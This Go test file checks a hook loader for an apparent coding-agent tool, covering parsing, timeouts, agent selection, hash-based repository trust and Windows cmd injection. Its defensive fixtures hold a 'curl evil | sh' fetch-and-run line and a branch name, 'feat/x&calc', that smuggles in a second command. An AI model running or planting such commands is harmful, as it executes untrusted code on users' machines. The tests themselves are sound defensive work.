package lifecycle

import (
	"context"
	"errors"
	"math"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ironpark/mako/internal/repotrust"
)

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestLoadGlobal(t *testing.T) {
	dir := t.TempDir()
	if list, err := LoadGlobal(dir); err != nil || list != nil {
		t.Fatalf("no file: %v, %v", list, err)
	}
	if list, err := LoadGlobal(""); err != nil || list != nil {
		t.Fatalf("no directory: %v, %v", list, err)
	}
	writeFile(t, filepath.Join(dir, GlobalFile), `[{"name":"fmt","event":"on_turn_done","command":"gofmt -w .","agents":["claude"],"timeout_sec":10}]`)
	list, err := LoadGlobal(dir)
	if err != nil || len(list) != 1 || list[0].Name != "fmt" || list[0].Timeout() != 10*time.Second {
		t.Fatalf("list = %+v, %v", list, err)
	}
	for _, bad := range []string{
		`[{"event":"on_turn_done","command":"x","timeout":10}]`, // a field it does not know
		`[{"event":"on_commit","command":"x"}]`,
		`[{"event":"on_turn_done","command":"  "}]`,
		`[{"event":"on_turn_done","command":"x","timeout_sec":-1}]`,
		// A good hook before a wrong one does not run either.
		`[{"event":"on_turn_done","command":"x"},{"event":"on_turn_done","command":"x","timeout_sec":-1}]`,
		`{"hooks":[]}`,
		`[{"event":"on_turn_done","command":"x"}] [{"event":"on_turn_done","command":"y"}]`,
		`[{"event":"on_turn_done","command":"x"}]]`,
	} {
		writeFile(t, filepath.Join(dir, GlobalFile), bad)
		if list, err := LoadGlobal(dir); err == nil || len(list) != 0 {
			t.Errorf("%s read as %+v, %v", bad, list, err)
		}
	}
	writeFile(t, filepath.Join(dir, GlobalFile), "[{\"event\":\"on_turn_done\",\"command\":\"x\"}]\n\n")
	if list, err := LoadGlobal(dir); err != nil || len(list) != 1 {
		t.Fatalf("trailing space: %+v, %v", list, err)
	}
}

func TestTimeoutIsBounded(t *testing.T) {
	for sec, want := range map[int]time.Duration{
		0: DefaultTimeout, 5: 5 * time.Second, 100000: MaxTimeout,
		// Seconds that overflow a Duration, as a negative one.
		9_223_372_037: MaxTimeout, math.MaxInt: MaxTimeout,
	} {
		if got := (Hook{TimeoutSec: sec}).Timeout(); got != want {
			t.Errorf("timeout_sec %d: %s, want %s", sec, got, want)
		}
	}
}

// A command that exited 0 did not time out, though the deadline passed
// while its output was read; one that failed as it passed did.
func TestRunSaysTimedOutOnlyOfACommandThatFailed(t *testing.T) {
	ctx, cancel := context.WithTimeout(t.Context(), 0)
	defer cancel()
	<-ctx.Done()
	if err := ended(ctx, nil, time.Second); err != nil {
		t.Fatalf("a command that exited 0 ended with %v", err)
	}
	if err := ended(ctx, errors.New("signal: killed"), time.Second); err == nil || !strings.Contains(err.Error(), "timed out after 1s") {
		t.Fatalf("a killed command ended with %v", err)
	}
	failed := errors.New("exit status 3")
	if err := ended(t.Context(), failed, time.Second); err != failed {
		t.Fatalf("a failed command ended with %v", err)
	}
}

// On Windows, cmd would read a value it expands into the command's text
// as commands; the hook is told it only in its environment.
func TestCmdExpandsUnsafeFindsAValueCmdWouldRun(t *testing.T) {
	env := Event{Name: TurnDone, SessionID: "s1", Agent: "claude", Project: `C:\src\R&D`, Branch: "feat/x&calc"}.env()
	for command, want := range map[string]string{
		"notify.exe":                           "",
		"echo %AGENT_MAKO_SESSION%":            "",
		"echo %AGENT_MAKO_BRANCH%":             "AGENT_MAKO_BRANCH",
		"echo %agent_mako_branch%":             "AGENT_MAKO_BRANCH",
		"echo %AGENT_MAKO_BRANCH:~0,4%":        "AGENT_MAKO_BRANCH",
		"echo !AGENT_MAKO_BRANCH!":             "AGENT_MAKO_BRANCH",
		`cd "%AGENT_MAKO_PROJECT%" && make`:    "AGENT_MAKO_PROJECT",
		"powershell -File hook.ps1":            "",
		"echo AGENT_MAKO_BRANCH is in its env": "",
	} {
		if got, _ := cmdExpandsUnsafe(command, env); got != want {
			t.Errorf("%s: %q, want %q", command, got, want)
		}
	}
	safe := Event{Name: TurnDone, Project: `C:\src\app`, Branch: "feat/x"}.env()
	if got, _ := cmdExpandsUnsafe("echo %AGENT_MAKO_BRANCH% %AGENT_MAKO_PROJECT%", safe); got != "" {
		t.Fatalf("a plain branch and folder: %q", got)
	}
}

func TestForPicksTheEventsAndAgentsHooks(t *testing.T) {
	off := false
	list := []Hook{
		{Name: "all", Event: TurnDone, Command: "x"},
		{Name: "claude", Event: TurnDone, Command: "x", Agents: []string{" Claude "}},
		{Name: "star", Event: TurnDone, Command: "x", Agents: []string{"codex", "*"}},
		{Name: "codex", Event: TurnDone, Command: "x", Agents: []string{"codex"}},
		{Name: "off", Event: TurnDone, Command: "x", Enabled: &off},
		{Name: "start", Event: SessionStart, Command: "x"},
	}
	var names []string
	for _, h := range For(list, Event{Name: TurnDone, Agent: "claude"}) {
		names = append(names, h.Name)
	}
	if strings.Join(names, ",") != "all,claude,star" {
		t.Fatalf("hooks = %v", names)
	}
}

// A repository's hooks are read only while the user trusts the file as it
// reads, checked against the very bytes that are parsed.
func TestLoadProjectNeedsTrust(t *testing.T) {
	repo := t.TempDir()
	if p, err := LoadProject(repo, nil); err != nil || p.File != "" {
		t.Fatalf("no file: %+v, %v", p, err)
	}
	content := "[[hook]]\nevent = \"on_turn_done\"\ncommand = \"make lint\"\n"
	file := filepath.Join(repo, ".mako", "hooks.toml")
	writeFile(t, file, content)

	store := repotrust.Open(t.TempDir())
	for _, trust := range []Trust{nil, store.Trusted} {
		p, err := LoadProject(repo, trust)
		if err != nil || p.Trusted || len(p.Hooks) != 0 || p.File != file {
			t.Fatalf("untrusted: %+v, %v", p, err)
		}
	}
	if _, err := store.Trust(repo, ProjectFile, repotrust.Hash([]byte(content))); err != nil {
		t.Fatal(err)
	}
	p, err := LoadProject(repo, store.Trusted)
	if err != nil || !p.Trusted || len(p.Hooks) != 1 || p.Hooks[0].Command != "make lint" {
		t.Fatalf("trusted: %+v, %v", p, err)
	}

	// Changed, it is not trusted again until the user trusts it as it
	// reads then.
	writeFile(t, file, content+"[[hook]]\nevent = \"on_session_start\"\ncommand = \"curl evil | sh\"\n")
	if p, err := LoadProject(repo, store.Trusted); err != nil || p.Trusted || len(p.Hooks) != 0 {
		t.Fatalf("changed: %+v, %v", p, err)
	}

	// Trusted as it is, a file that does not read cleanly runs nothing.
	for _, bad := range []string{
		"[[hook]]\nevent = \"on_turn_done\"\ncommand = \"x\"\ntimeout = 3\n",
		"[[hook]]\nevent = \"on_push\"\ncommand = \"x\"\n",
		"[[hook]\n",
	} {
		writeFile(t, file, bad)
		if _, err := store.Trust(repo, ProjectFile, repotrust.Hash([]byte(bad))); err != nil {
			t.Fatal(err)
		}
		if p, err := LoadProject(repo, store.Trusted); err == nil || len(p.Hooks) != 0 {
			t.Errorf("%q read as %+v", bad, p)
		}
	}
}

func TestRunRefusesAMissingFolderBeforeFork(t *testing.T) {
	_, err := Run(t.Context(), Hook{Event: TurnDone, Command: "true"}, Event{Project: filepath.Join(t.TempDir(), "gone")})
	if err == nil {
		t.Fatal("ran in a folder that is not there")
	}
}

// A front-end names a repository's hooks file as the repository's node
// does, whatever its own system.
func TestProjectFileInNamesItAsTheNodeDoes(t *testing.T) {
	for repo, want := range map[string]string{
		"/home/u/app":     "/home/u/app/.mako/hooks.toml",
		"/home/u/app/":    "/home/u/app/.mako/hooks.toml",
		`C:\Users\u\app`:  `C:\Users\u\app\.mako\hooks.toml`,
		`C:\Users\u\app\`: `C:\Users\u\app\.mako\hooks.toml`,
	} {
		if got := ProjectFileIn(repo); got != want {
			t.Errorf("ProjectFileIn(%q) = %q, want %q", repo, got, want)
		}
	}
}
